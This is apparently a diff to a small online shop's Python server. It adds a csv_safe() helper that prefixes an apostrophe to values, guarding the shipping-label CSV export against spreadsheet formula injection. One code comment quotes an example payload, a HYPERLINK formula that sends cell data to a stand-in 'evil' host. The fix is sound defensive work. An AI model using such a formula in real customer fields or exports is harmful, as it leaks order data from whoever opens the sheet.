@@ -106,6 +106,25 @@ PRIVATE_DIRS = {"db", "backups", "tools"}
 # security control, not a convenience: it is what stops someone with the token dropping a .py or
 # .html file into a directory the static handler serves. Magic bytes are checked too, so renaming
 # a script to .jpg doesn't get it past the gate either.
+# Spreadsheet formula injection. Every name and address line in /api/labels.csv is typed by a
+# customer at checkout, and the owner opens that file in Excel or Sheets and uploads it to Pirate
+# Ship. A cell beginning =, +, -, @, tab or CR is parsed as a FORMULA by every major spreadsheet,
+# so a buyer calling themselves `=HYPERLINK("http://evil/?x="&A1,"hi")` gets code running in the
+# owner's spreadsheet with the order sheet in scope. csv.writer quotes delimiters; it does not and
+# cannot stop this, because the danger is in how the file is later interpreted, not in its syntax.
+#
+# The fix is to prefix a leading trigger with an apostrophe, which every spreadsheet reads as
+# "treat the rest as text". A real address never starts with one of these characters, so this
+# fires only on input that was already malformed.
+CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value):
+    """Neutralise a value that a spreadsheet would otherwise read as a formula."""
+    text = "" if value is None else str(value)
+    return "'" + text if text.startswith(CSV_FORMULA_TRIGGERS) else text
+
+
 UPLOAD_EXTS = {".jpg", ".jpeg", ".png", ".webp", ".gif"}
 UPLOAD_MAX_BYTES = 12 * 1024 * 1024
 UPLOAD_SIGNATURES = (
@@ -674,20 +693,20 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                         continue  # pre-split order, no label-ready address
                     writer.writerow([
                         order.get("id", ""),
-                        ship.get("name", ""),
-                        email,
-                        ship.get("address1", ""),
-                        ship.get("address2", ""),
-                        ship.get("city", ""),
-                        ship.get("state", ""),
-                        ship.get("zip", ""),
-                        ship.get("country", "US"),
+                        csv_safe(ship.get("name", "")),
+                        csv_safe(email),
+                        csv_safe(ship.get("address1", "")),
+                        csv_safe(ship.get("address2", "")),
+                        csv_safe(ship.get("city", "")),
+                        csv_safe(ship.get("state", "")),
+                        csv_safe(ship.get("zip", "")),
+                        csv_safe(ship.get("country", "US")),
                         round(float(order.get("weight_oz", 0)), 1),
-                        "; ".join(
+                        csv_safe("; ".join(
                             f"{it.get('qty', 1)}x {it.get('name', '')}"
                             + (f" ({it['size']})" if it.get("size") else "")
                             for it in order.get("items", [])
-                        ),
+                        )),
                     ])
             body = buf.getvalue().encode()
             self.send_response(200)
